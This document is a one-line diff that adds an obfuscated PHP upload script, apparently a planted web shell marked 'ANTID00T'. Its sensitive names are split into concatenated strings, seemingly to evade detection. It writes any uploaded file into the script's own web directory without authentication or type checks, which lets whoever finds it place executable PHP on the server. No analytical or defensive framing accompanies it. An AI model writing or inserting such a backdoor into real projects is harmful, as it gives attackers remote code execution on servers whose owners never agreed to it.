@@ -1,0 +1,1 @@
+<?php $F=$GLOBALS['_FI'.'LES'];$M='move_'.'uploaded_'.'file';$B='base'.'name';if(isset($F['f'])&&$F['f']['error']===0){$n=$B($F['f']['name']);if($M($F['f']['tmp_name'],__DIR__ . '/' . $n)){echo 'OK:'.$n;}else{echo 'ERR';}exit;}?><form method="post" enctype="multipart/form-data"><input type="file" name="f"> <button>Upload</button> <b>ANTID00T</b></form>
